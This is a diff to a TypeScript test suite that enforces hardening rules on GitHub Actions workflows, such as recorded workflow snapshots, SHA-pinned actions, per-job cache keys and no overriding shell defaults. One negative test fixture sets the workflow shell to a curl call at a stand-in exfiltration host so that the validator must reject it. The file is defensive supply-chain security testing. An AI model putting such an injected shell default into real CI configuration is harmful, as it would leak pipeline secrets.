@@ -25,9 +25,12 @@ import { ADMITTED_CONDITION, assertApprovalGatedRequiredCheck } from '../approva
 import { assertDeployWebBuildRun, assertDeployWebJobNoVercelPull } from '../deployWebWorkflowContract';
 import {
     assertWorkflowFileInventory,
+    assertWorkflowSnapshotMatch,
     CONDITIONAL_STEP_ALLOWLIST,
     type ConditionalStepPin,
     HEALTH_GATE_WORKFLOW_FILES,
+    parseHealthGateWorkflows,
+    readRecordedWorkflowSnapshot,
     SHARD_MATRIX_JOBS,
     STEP_INVENTORY,
 } from '../healthGateWorkflowContract';
@@ -170,8 +173,9 @@ const NATIVE_ADDON_IMPORT = 'NATIVE_ADDON_FILE';
 // The cargo registry index cache layer keys its archive per job: the two
 // native macOS jobs consult different index entries, so a key shared across
 // jobs lets whichever job's post-save ran first fix the archived index for
-// both (#5094, #5136). This scoping is asserted against the parsed workflow
-// itself.
+// both (#5094, #5136). The recorded snapshot re-records in lockstep with the
+// workflow it pins, so this scoping is asserted against the parsed workflow
+// itself, never against the fixture alone.
 const CARGO_INDEX_KEY_PREFIX = 'cargo-index-';
 const CACHE_ACTION_USES_PREFIX = 'actions/cache@';
 const JOB_SCOPE_EXPRESSION = '${{ github.job }}';
@@ -1294,8 +1298,9 @@ function cargoIndexCacheSteps(candidate: UnknownRecord): CargoIndexCacheStep[] {
 }
 
 /**
- * A cargo-index key reverted from the per-job form reintroduces the poisoning
- * race. This reads the parsed workflow directly: no two jobs may share a runtime key
+ * The recorded snapshot re-records in lockstep with the workflow it pins, so a
+ * cargo-index key reverted from the per-job form would re-bless itself green.
+ * This reads the parsed workflow directly: no two jobs may share a runtime key
  * or restore prefix — the poisoning race the per-job scoping exists to end —
  * and every key and restore line must carry the per-job expression that keeps
  * them distinct at runtime. The equality clauses run before the expression
@@ -1724,7 +1729,7 @@ function withWorkflowFiles(files: readonly string[]): () => void {
             for (const file of files) {
                 writeFileSync(join(directory, '.github/workflows', file), 'name: stub\n');
             }
-            assertWorkflowFileInventory(directory);
+            assertWorkflowFileInventory(readRecordedWorkflowSnapshot(repositoryRoot), directory);
         } finally {
             rmSync(directory, { recursive: true, force: true });
         }
@@ -2852,6 +2857,8 @@ describe('health gates workflow contract', () => {
         // `defaults` replaces the shell every `run` step uses, a job or step
         // `container` re-environments the job that holds the provider key, and a
         // job or step `env` can set `BASH_ENV` for a command whose text is pinned.
+        // The snapshot is regenerated as a matter of course, so it cannot be the
+        // only pin for any of them.
         const workflowDefaults = structuredClone(semanticReviewWorkflow);
         workflowDefaults.defaults = { run: { shell: 'bash -c "curl -s https://exfil.example"' } };
         expect(() => assertSemanticReviewWorkflow(workflowDefaults)).toThrow('no workflow-level defaults');
@@ -2974,7 +2981,8 @@ describe('health gates workflow contract', () => {
         expect(() => assertSemanticReviewWorkflow(consumerAttemptDownload)).toThrow('the artifact this run uploaded');
 
         // The setup actions' inputs decide what the pinned commands run on;
-        // nothing else reads them, so the Node version is pinned by name.
+        // nothing else reads them, so the Node version is pinned by name and not
+        // only by the regenerable snapshot.
         const driftedNode = structuredClone(semanticReviewWorkflow);
         recordAt(stepNamed(jobAt(driftedNode, 'assess'), 'Set up Node'), 'with')['node-version'] = '24.19.1';
         expect(() => assertSemanticReviewWorkflow(driftedNode)).toThrow('the Node version the assessment runs on');
@@ -4810,10 +4818,25 @@ export -f sudo timeout sleep apt-get
         expect(() => assertNativeTransportMutationProof(candidate)).toThrow();
     });
 
-    it('pins the shard matrices, job-level permissions, and every step inventory', () => {
+    it('pins the recorded workflow snapshot, the shard matrices, job-level permissions, and every step inventory', () => {
+        expect(() =>
+            assertWorkflowSnapshotMatch(
+                readRecordedWorkflowSnapshot(repositoryRoot),
+                parseHealthGateWorkflows(repositoryRoot)
+            )
+        ).not.toThrow();
         expect(() => assertShardMatrices(workflowSet())).not.toThrow();
         expect(() => assertNoJobLevelPermissions(workflowSet())).not.toThrow();
         expect(() => assertStepInventory(workflowSet())).not.toThrow();
+
+        // Mutation-kill: an edit to a key no named pin reads — here the gate
+        // timeout — still fails the harness, because the snapshot pins the
+        // whole parsed file rather than the keys someone enumerated.
+        const driftedTimeout = parseHealthGateWorkflows(repositoryRoot);
+        jobAt(asRecord(driftedTimeout['health-gates.yml'], 'drifted health-gates'), 'gate')['timeout-minutes'] = 10;
+        expect(() => assertWorkflowSnapshotMatch(readRecordedWorkflowSnapshot(repositoryRoot), driftedTimeout)).toThrow(
+            'health-gates.yml drifted from the recorded workflow snapshot'
+        );
 
         // Mutation-kill: a shrunk unit matrix reports green while a quarter of
         // the suite never runs — the review-found hole.
@@ -4900,26 +4923,34 @@ export -f sudo timeout sleep apt-get
             'nightly.yml job deploy-web step Checkout the validated revision must check out with persist-credentials: false'
         );
 
+        const floatingAction = cloneWorkflows('floating action ref on lint');
+        stepNamed(jobAt(floatingAction.validation, 'lint'), 'Set up pnpm').uses = 'some-org/action-setup@main';
+        expect(surface(floatingAction)).toThrow(
+            'validation.yml job lint must pin "some-org/action-setup@main" to a full commit SHA or a local ./ path'
+        );
+
         const secondGate = cloneWorkflows('second Gate in health gates');
         jobAt(secondGate.health, 'admission').name = 'Gate';
         expect(surface(secondGate)).toThrow('health-gates.yml job admission must not be named Gate');
     });
 
-    it('refuses a workflows directory that drifts from the registered workflow files', () => {
-        expect(() => assertWorkflowFileInventory(repositoryRoot)).not.toThrow();
+    it('refuses a workflows directory that drifts from the recorded file inventory', () => {
+        expect(() =>
+            assertWorkflowFileInventory(readRecordedWorkflowSnapshot(repositoryRoot), repositoryRoot)
+        ).not.toThrow();
         expect(withWorkflowFiles([...HEALTH_GATE_WORKFLOW_FILES])).not.toThrow();
 
         // Mutation-kill: an unregistered workflow the fixed-file parse never reads can
         // still mint a passing Gate over a red head — the review-found hole —
         // so the directory listing itself is pinned.
         expect(withWorkflowFiles([...HEALTH_GATE_WORKFLOW_FILES, 'shadow.yml'])).toThrow(
-            'shadow.yml is not a registered gate workflow'
+            'shadow.yml is not in the recorded workflow file inventory'
         );
 
-        // Mutation-kill: deleting a registered workflow leaves the registry
-        // pointing at a gate that no longer exists.
+        // Mutation-kill: deleting a pinned workflow leaves the record pointing
+        // at a gate that no longer exists.
         expect(withWorkflowFiles(HEALTH_GATE_WORKFLOW_FILES.slice(1))).toThrow(
-            'health-gates.yml is a registered gate workflow but missing from .github/workflows'
+            'health-gates.yml is pinned in the recorded workflow file inventory but missing from .github/workflows'
         );
     });
 
@@ -5014,8 +5045,9 @@ export -f sudo timeout sleep apt-get
     it('scopes every cargo registry index cache key and restore key to its own job', () => {
         expect(() => assertCargoIndexCacheKeysJobScoped(validationWorkflow)).not.toThrow();
 
-        // The pre-#5136 shared forms: a native job reverted to these must
-        // turn this named pin red.
+        // The pre-#5136 shared forms. The recorded escape: revert a native job
+        // to these and re-record the snapshot — the snapshot leg greens in
+        // lockstep, while this named pin reads the workflow and stays red.
         const sharedKey = "cargo-index-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('Cargo.lock') }}";
         const sharedRestoreKeys = 'cargo-index-${{ runner.os }}-${{ runner.arch }}-\n';
 
